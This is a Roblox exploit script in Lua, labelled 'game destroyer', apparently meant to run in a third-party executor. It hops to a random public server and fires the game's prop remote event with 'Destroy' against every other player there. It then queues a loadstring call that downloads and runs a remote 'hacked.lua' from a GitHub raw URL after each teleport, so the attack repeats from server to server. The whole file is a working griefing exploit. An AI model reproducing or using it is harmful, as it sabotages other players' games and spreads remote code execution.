-- game destroyer
repeat task.wait() until game:IsLoaded()
local TeleportService = game:GetService("TeleportService")
local data = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Dsc&limit=100")).data
local c = 0
for i = 1, #data do
    local server = data[i-c]
    if not server.playing then
        table.remove(data, i-c)
        c = c + 1
    end
end
local function fyshuffle( tInput )
    local tReturn = {}
    for i = #tInput, 1, -1 do
        local j = math.random(i)
        tInput[i], tInput[j] = tInput[j], tInput[i]
        table.insert(tReturn, tInput[i])
    end
    return tReturn
end
data = fyshuffle(data)
local function randomhop(data, failed)
    failed = failed or {}
    for _, s in pairs(data) do
        local id = s.id
        if not failed[id] and id ~= game.JobId then
            if s.playing < s.maxPlayers then
                local connection
                connection = TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
                    connection:Disconnect()
                    failed[id] = true
                    randomhop(data, failed)
                end)
                TeleportService:TeleportToPlaceInstance(game.PlaceId, id)
                break
            end
        end
    end
end
task.spawn(function()randomhop(data)end)
for _,v in next, game:GetService("Players"):GetPlayers() do
    if v ~= game:GetService("Players").LocalPlayer then
        game:GetService("ReplicatedStorage").Events.Props.PropRE:FireServer("Destroy", v)
    end
end
syn.queue_on_teleport(
    [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PeaPattern/Tall-Man-Run/main/hacked.lua"))()
    ]]
)